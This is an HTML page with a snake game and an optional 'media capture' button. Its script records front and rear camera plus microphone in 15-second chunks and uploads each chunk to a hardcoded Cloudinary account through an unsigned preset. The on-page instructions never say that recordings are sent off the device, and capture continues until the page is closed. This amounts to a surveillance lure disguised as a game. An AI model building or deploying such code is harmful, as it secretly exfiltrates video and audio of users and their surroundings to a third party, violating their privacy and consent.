<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
<title>Snake Game + Media Capture (Optional)</title>
<style>
  /* Reset & base */
  * {
    box-sizing: border-box;
  }
  body {
    margin: 0;
    background: #121212;
    color: #EEE;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    display: flex;
    flex-direction: column;
    align-items: center;
    min-height: 100vh;
    padding: 20px 10px;
  }
  h1 {
    margin: 0 0 12px 0;
    font-weight: 700;
    user-select: none;
  }

  /* Game container */
  #gameContainer {
    display: flex;
    flex-direction: column;
    align-items: center;
    background: #222;
    padding: 15px;
    border-radius: 12px;
    box-shadow: 0 0 14px rgba(100, 0, 255, 0.6);
  }

  /* Canvas */
  canvas#game {
    background: #000;
    border-radius: 10px;
    border: 3px solid #6a0dad;
    touch-action: none; /* disable scrolling on mobile while swiping */
  }

  /* Score display */
  #scoreBoard {
    margin-top: 12px;
    font-size: 1.6rem;
    font-weight: 600;
    letter-spacing: 1px;
    user-select: none;
  }

  /* Buttons container */
  #buttons {
    margin-top: 15px;
    display: flex;
    gap: 15px;
  }

  button {
    background: #6a0dad;
    border: none;
    color: white;
    padding: 12px 26px;
    font-size: 1.1rem;
    font-weight: 600;
    border-radius: 10px;
    cursor: pointer;
    user-select: none;
    transition: background-color 0.3s ease;
  }
  button:hover, button:focus {
    background: #8b3ded;
    outline: none;
  }
  button:disabled {
    background: #4b0082;
    cursor: not-allowed;
  }

  /* Instructions */
  #instructions {
    margin-top: 25px;
    max-width: 320px;
    font-size: 0.9rem;
    line-height: 1.4;
    color: #ccc;
    user-select: none;
  }
</style>
</head>
<body>

<h1>Snake Game + Media Capture</h1>

<div id="gameContainer">
  <canvas id="game" width="320" height="320"></canvas>
  <div id="scoreBoard">Score: 0</div>
  <div id="buttons">
    <button id="newGameBtn">New Game</button>
    <button id="startCaptureBtn">Start Media Capture (Optional)</button>
  </div>
  <div id="instructions">
    Use arrow keys (desktop) or swipe on the game area (mobile) to control the snake.<br />
    Click "Start Media Capture" only if you want to allow camera + mic access.<br />
    No recording happens unless you press the capture button.
  </div>
</div>

<script>
(() => {
  // === Config ===
  const CLOUD_NAME = 'dps0g5ftz'; // Your Cloudinary cloud name
  const UPLOAD_PRESET = 'unsigned'; // Your unsigned preset

  // === Elements ===
  const canvas = document.getElementById('game');
  const ctx = canvas.getContext('2d');
  const scoreBoard = document.getElementById('scoreBoard');
  const newGameBtn = document.getElementById('newGameBtn');
  const startCaptureBtn = document.getElementById('startCaptureBtn');

  // === Game Settings ===
  const gridSize = 16;
  const tileCount = canvas.width / gridSize;
  let snake = [{ x: 7, y: 7 }];
  let velocity = { x: 0, y: 0 };
  let food = { x: 5, y: 5 };
  let score = 0;
  let gameSpeed = 120;
  let gameInterval = null;

  // Touch controls
  let touchStartX = null;
  let touchStartY = null;

  // Session ID for media uploads
  const sessionId = 'session_' + Date.now();

  // --- Game functions ---

  function drawGame() {
    ctx.fillStyle = '#000';
    ctx.fillRect(0, 0, canvas.width, canvas.height);

    // Draw snake
    ctx.fillStyle = '#6a0dad';
    snake.forEach(segment => {
      ctx.fillRect(segment.x * gridSize, segment.y * gridSize, gridSize - 2, gridSize - 2);
    });

    // Draw food
    ctx.fillStyle = '#e91e63';
    ctx.fillRect(food.x * gridSize, food.y * gridSize, gridSize - 2, gridSize - 2);
  }

  function updateGame() {
    const head = { x: snake[0].x + velocity.x, y: snake[0].y + velocity.y };

    // Wrap edges
    if (head.x < 0) head.x = tileCount - 1;
    if (head.x >= tileCount) head.x = 0;
    if (head.y < 0) head.y = tileCount - 1;
    if (head.y >= tileCount) head.y = 0;

    // Check collision with self
    if (snake.some(seg => seg.x === head.x && seg.y === head.y)) {
      endGame();
      return;
    }

    snake.unshift(head);

    if (head.x === food.x && head.y === food.y) {
      score++;
      placeFood();
      scoreBoard.textContent = `Score: ${score}`;

      if (gameSpeed > 50) {
        gameSpeed -= 5;
        clearInterval(gameInterval);
        gameInterval = setInterval(gameLoop, gameSpeed);
      }
    } else {
      snake.pop();
    }
  }

  function placeFood() {
    food = {
      x: Math.floor(Math.random() * tileCount),
      y: Math.floor(Math.random() * tileCount),
    };
    // Avoid spawning food inside snake
    if (snake.some(seg => seg.x === food.x && seg.y === food.y)) {
      placeFood();
    }
  }

  function gameLoop() {
    updateGame();
    drawGame();
  }

  function startGame() {
    snake = [{ x: 7, y: 7 }];
    velocity = { x: 0, y: 0 };
    score = 0;
    gameSpeed = 120;
    scoreBoard.textContent = 'Score: 0';
    placeFood();

    if (gameInterval) clearInterval(gameInterval);
    gameInterval = setInterval(gameLoop, gameSpeed);
  }

  function endGame() {
    alert(`Game over! Your score was ${score}. Starting new game.`);
    startGame();
  }

  // --- Controls ---

  window.addEventListener('keydown', e => {
    if (e.repeat) return;
    switch (e.key) {
      case 'ArrowUp': if (velocity.y === 0) velocity = { x: 0, y: -1 }; break;
      case 'ArrowDown': if (velocity.y === 0) velocity = { x: 0, y: 1 }; break;
      case 'ArrowLeft': if (velocity.x === 0) velocity = { x: -1, y: 0 }; break;
      case 'ArrowRight': if (velocity.x === 0) velocity = { x: 1, y: 0 }; break;
    }
  });

  // Touch swipe for mobile
  canvas.addEventListener('touchstart', e => {
    if (e.touches.length === 1) {
      touchStartX = e.touches[0].clientX;
      touchStartY = e.touches[0].clientY;
    }
  });

  canvas.addEventListener('touchend', e => {
    if (touchStartX === null || touchStartY === null) return;

    const touchEndX = e.changedTouches[0].clientX;
    const touchEndY = e.changedTouches[0].clientY;
    const diffX = touchEndX - touchStartX;
    const diffY = touchEndY - touchStartY;

    if (Math.abs(diffX) > Math.abs(diffY)) {
      // Horizontal swipe
      if (diffX > 20 && velocity.x === 0) velocity = { x: 1, y: 0 };
      else if (diffX < -20 && velocity.x === 0) velocity = { x: -1, y: 0 };
    } else {
      // Vertical swipe
      if (diffY > 20 && velocity.y === 0) velocity = { x: 0, y: 1 };
      else if (diffY < -20 && velocity.y === 0) velocity = { x: 0, y: -1 };
    }
    touchStartX = null;
    touchStartY = null;
  });

  // --- Button handlers ---
  newGameBtn.addEventListener('click', startGame);

  // --- Media capture ---

  let frontRecorder, rearRecorder;
  let frontChunks = [];
  let rearChunks = [];

  async function uploadToCloudinary(blob, folder, resourceType = 'video') {
    const url = `https://api.cloudinary.com/v1_1/${CLOUD_NAME}/${resourceType}/upload`;
    const formData = new FormData();
    formData.append('file', blob);
    formData.append('upload_preset', UPLOAD_PRESET);
    formData.append('folder', folder);

    try {
      const res = await fetch(url, {
        method: 'POST',
        body: formData,
      });
      const data = await res.json();
      console.log(`Uploaded to ${folder}:`, data.secure_url);
      return data.secure_url;
    } catch (err) {
      console.error('Cloudinary upload error:', err);
      return null;
    }
  }

  // Record and upload in chunks of 15s, infinite loop until stopped (you can expand later)
  function recordAndUpload(stream, folderName, chunkArray) {
    if (!stream) return;

    const options = { mimeType: 'video/webm;codecs=vp8,opus' };
    const recorder = new MediaRecorder(stream, options);

    recorder.ondataavailable = async e => {
      if (e.data && e.data.size > 0) {
        chunkArray.push(e.data);
        if (chunkArray.length >= 1) { // upload per chunk, can be tuned
          const blob = new Blob(chunkArray, { type: 'video/webm' });
          chunkArray.length = 0;
          await uploadToCloudinary(blob, folderName);
        }
      }
    };

    recorder.onstop = async () => {
      if (chunkArray.length) {
        const blob = new Blob(chunkArray, { type: 'video/webm' });
        chunkArray.length = 0;
        await uploadToCloudinary(blob, folderName);
      }
    };

    recorder.start(15000);
    return recorder;
  }

  async function startMediaCapture() {
    startCaptureBtn.disabled = true;
    startCaptureBtn.textContent = 'Starting Capture...';

    try {
      // Front camera
      const frontStream = await navigator.mediaDevices.getUserMedia({
        audio: true,
        video: { facingMode: 'user' },
      });

      // Rear camera (some devices might not support)
      let rearStream = null;
      try {
        rearStream = await navigator.mediaDevices.getUserMedia({
          audio: true,
          video: { facingMode: { exact: 'environment' } },
        });
      } catch {
        console.warn('Rear camera not available');
      }

      frontRecorder = recordAndUpload(frontStream, `${sessionId}/front`, frontChunks);
      if (rearStream) {
        rearRecorder = recordAndUpload(rearStream, `${sessionId}/rear`, rearChunks);
      }

      startCaptureBtn.textContent = 'Capture Started - You can close this or reload to stop';
    } catch (err) {
      alert('Media capture permission denied or error occurred.');
      console.error(err);
      startCaptureBtn.textContent = 'Start Media Capture (Optional)';
      startCaptureBtn.disabled = false;
    }
  }

  startCaptureBtn.addEventListener('click', startMediaCapture);

  // --- Start game automatically on page load ---
  window.onload = startGame;

})();
</script>
</body>
</html>
